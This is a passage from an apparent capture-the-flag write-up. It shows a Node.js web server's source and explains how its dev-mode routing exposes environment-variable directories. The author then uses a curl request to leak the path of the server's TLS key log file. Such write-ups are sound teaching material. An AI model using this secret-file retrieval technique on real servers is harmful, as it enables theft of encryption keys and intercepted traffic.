  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;env_keys&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Object&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nx"&gt;env_keys&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;typeof&lt;/span&gt; &lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;env_keys&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]]&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;string&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;dirs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;env_keys&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;toLowerCase&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/*&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;uniqueArray&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dirs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;dev_mode&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;    &lt;span class="c1"&gt;//Can set env variable to open up directories during dev&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;    &lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;env_dirs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;load_envs&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;env_dirs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/pub/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/uploads/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;api_functions&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;login&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;login&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;logout&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;logout&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;users&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;find_users&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;register&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;register&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;upload&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;upload&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;list&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;list_caps&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;delete&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;delete_caps&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;sniff&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;sniff_traffic&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;process&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;start_process&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;api_function&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;Session&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;sessionizer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;action&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;params&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;action&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;Session&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;authenticated&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;Object&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;api_functions&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;includes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;action&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;login&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;register&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;users&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;includes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;action&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;typeof&lt;/span&gt; &lt;span class="nx"&gt;api_functions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;action&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;function&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
          &lt;span class="nx"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;api_functions&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;action&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;Session&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
          &lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
          &lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
          &lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Not Found&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;401&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Unauthorized&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nx"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="c1"&gt;//Route for anything in the public folder except index, home and register&lt;/span&gt;
&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;env_dirs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;Session&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;sessionizer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="c1"&gt;//Splits into an array delimited by /&lt;/span&gt;
    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;split_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;path&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;clean&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="c1"&gt;//Grabs directory which should be first element in array&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;dir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;split_path&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;toUpperCase&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;    &lt;span class="nx"&gt;split_path&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;shift&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;split_path&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;indexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;..&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/\.\./g&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;index.html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;home.html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;register.html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;includes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;mime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;lookup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;__dirname&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/pub/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="hll"&gt;    &lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;readFileSync&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;__dirname&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;env&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/pub/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;404&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Not Found&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;

&lt;span class="nx"&gt;router&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/api/:action&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nx"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;api_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/api/:action&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;koaBody&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt; &lt;span class="nx"&gt;multipart&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="p"&gt;}),&lt;/span&gt; &lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nx"&gt;await&lt;/span&gt; &lt;span class="nx"&gt;api_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;})&lt;/span&gt;

&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;http2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createSecureServer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;app&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;span class="nx"&gt;server&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;443&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;What can we learn from this source code:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Line 26: the application is running in dev mode&lt;/li&gt;
&lt;li&gt;Line 27: the &lt;code&gt;key_log_path&lt;/code&gt; variable holds the path to the SSL secrets
used by the server&lt;/li&gt;
&lt;li&gt;Line 27: the &lt;code&gt;process.env&lt;/code&gt; contains the path to the SSL secrets file&lt;/li&gt;
&lt;li&gt;Lines 86-88: in dev mode, every directory that is in the &lt;code&gt;process.env&lt;/code&gt;
variable is potentially accessible via the webserver.&lt;/li&gt;
&lt;li&gt;Lines 132, 140: if we access &lt;a class="reference external" href="https://packalyzer.kringlecastle.com/secret_directory/secret_file"&gt;https://packalyzer.kringlecastle.com/secret_directory/secret_file&lt;/a&gt;,
the webserver will use the value of &lt;code&gt;process.env.secret_directory&lt;/code&gt; as
the name of our folder to get the &lt;code&gt;secret_file&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This last point is interesting. Since &lt;code&gt;process.env&lt;/code&gt; contains the path to
the SSL secrets, we can try to use this automatic resolution to get the content
of &lt;code&gt;key_log_path&lt;/code&gt;. First let's try to resolve the
&lt;code&gt;process.env.SSLKEYLOGFILE&lt;/code&gt; variable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; curl &lt;span class="s1"&gt;&amp;#39;https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;Error: ENOENT: no such file or directory, open &amp;#39;/opt/http2packalyzer_clientrandom_ssl.log/&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, the value of this variable seems to be
&lt;code&gt;packalyzer_clientrandom_ssl.log&lt;/code&gt;. We can now access the file. We use the
same trick as before to resolve the &lt;code&gt;process.env.DEV&lt;/code&gt; variable:&lt;/p&gt;
